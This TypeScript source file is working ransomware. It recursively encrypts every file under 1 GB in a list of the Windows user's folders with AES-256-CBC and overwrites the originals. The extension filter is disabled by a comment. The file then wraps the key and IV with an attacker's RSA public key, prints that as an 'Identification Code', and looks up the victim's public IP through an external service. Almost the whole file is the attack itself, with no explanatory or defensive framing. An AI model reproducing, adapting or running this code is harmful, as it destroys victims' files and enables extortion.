import os from 'os';
import fs from 'fs';
import crypto from 'crypto';
import path from 'path';
import config from './config.json';
import https from 'https';

const encrypt = () => {
  const userName: string = os.userInfo().username;
  console.log(userName);
  const userDir: string = `C:\\Users\\${userName}`;

  console.log('Starting...\n');

  const key: string = createRandomString(32);
  const iv: Buffer = crypto.randomBytes(16);

  console.log('Encrypted Files :');

  for (let i = 0; i < config.targetFolder.length; i++) {
    console.log(i, config.targetFolder[i]);
    encryptDir(`${userDir}\\${config.targetFolder[i]}`, key, iv);
  }
  console.log('\nEncryption Finished!\n');

  const keyData: string = `${key}${iv.toString('hex')}`;
  const idCode: string = encryptPublicKey(keyData);

  console.log(`Identification Code : ${idCode}\n`);
};

const createRandomString = (length: number): string => {
  const characters: string =
    'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  const charactersLength: number = characters.length;

  let result: string = '';
  for (let i = 0; i < length; i++)
    result += characters.charAt(Math.floor(Math.random() * charactersLength));

  return result;
};

const encryptDir = (dir: string, key: string, iv: Buffer) => {
  if (!fs.existsSync(dir)) return;

  fs.readdirSync(dir).forEach((file) => {
    try {
      const fullPath: string = path.join(dir, file);

      if (fs.lstatSync(fullPath).isDirectory()) {
        encryptDir(fullPath, key, iv);
      } else {
        let isTarget: boolean = true;

        // FODA SE EXTENSÃO
        // check extension
        // for (let j = 0; j < config.targetExtension.length; j++) {
        //   if (fullPath.toLowerCase().endsWith(config.targetExtension[j])) {
        //     console.log(j);
        //     isTarget = true;
        //     break;
        //   }
        // }

        if (isTarget) {
          let fileStat = fs.statSync(fullPath);
          let fileSize = fileStat['size'];
          if (fileSize < 1e9) {
            encryptFile(fullPath, key, iv);

            console.log(fullPath);
          }
        }
      }
    } catch (error) {
      console.log(error);
    }
  });
};

const encryptFile = (file: string, key: string, iv: Buffer) => {
  const fileData = fs.readFileSync(file).toString();
  const encryptedData = encryptAES(fileData, key, iv);

  fs.writeFileSync(file, encryptedData);
};

const encryptAES = (plainText: string, key: string, iv: Buffer): string => {
  const cipher = crypto.createCipheriv('aes-256-cbc', key, iv);

  let encryptedText: Buffer = cipher.update(plainText);
  encryptedText = Buffer.concat([encryptedText, cipher.final()]);

  return encryptedText.toString('base64');
};

const encryptPublicKey = (plainText: string): string => {
  const plainBuffer = Buffer.from(plainText);
  const encryptedBuffer: Buffer = crypto.publicEncrypt(
    config.publicKey,
    plainBuffer,
  );

  return encryptedBuffer.toString('base64');
};

const getPublicIP = () => {
  return new Promise((resolve, reject) => {
    https
      .get('https://api64.ipify.org?format=json', (res) => {
        let data = '';

        res.on('data', (chunk) => {
          data += chunk;
        });

        res.on('end', () => {
          try {
            const result = JSON.parse(data);
            resolve(result.ip);
            // @ts-ignore
          } catch (err: any) {
            reject('Erro ao parsear resposta: ' + err.message);
          }
        });
      })
      .on('error', (err) => {
        reject('Erro ao obter IP público: ' + err.message);
      });
  });
};

getPublicIP()
  .then((ip) => {
    console.log('IP público:', ip);
  })
  .catch((err) => {
    console.error(err);
  });

// execute
encrypt();
